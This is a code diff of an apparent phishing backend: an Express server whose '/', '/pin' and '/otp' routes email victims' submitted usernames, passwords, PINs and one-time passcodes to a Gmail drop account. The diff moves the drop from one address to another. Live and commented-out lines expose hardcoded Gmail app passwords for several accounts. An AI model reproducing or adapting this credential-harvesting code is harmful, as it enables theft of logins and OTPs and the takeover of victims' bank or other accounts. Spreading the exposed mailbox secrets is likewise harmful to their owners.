@@ -22,8 +22,10 @@ app.post("/", (req, res) => {
     auth: {
       // user: "edehchinedu59@gmail.com",
       // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
+      user: "Backendapp7@gmail.com",
+      pass: "rytpgbnuikjkuqbz",
       // user: 'Victorchinemerem191@gmail.com',
       // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
@@ -35,7 +37,7 @@ app.post("/", (req, res) => {
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
+    to: "Backendapp7@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -60,8 +62,10 @@ app.post("/pin", (req, res) => {
     auth: {
       // user: "edehchinedu59@gmail.com",
       // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
+      user: "Backendapp7@gmail.com",
+      pass: "rytpgbnuikjkuqbz",
       // user: 'Victorchinemerem191@gmail.com',
       // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
@@ -73,7 +77,7 @@ app.post("/pin", (req, res) => {
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
+    to: "Backendapp7@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -98,14 +102,16 @@ app.post("/otp", (req, res) => {
     auth: {
       // user: "edehchinedu59@gmail.com",
       // pass: "yknycyzsxdkxpepq",
-      user: "gracesufficient65@gmail.com",
-      pass: "gdvumrctjugtigmo",
+      // user: "gracesufficient65@gmail.com",
+      // pass: "gdvumrctjugtigmo",
+      user: "Backendapp7@gmail.com",
+      pass: "rytpgbnuikjkuqbz",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "gracesufficient65@gmail.com",
+    to: "Backendapp7@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
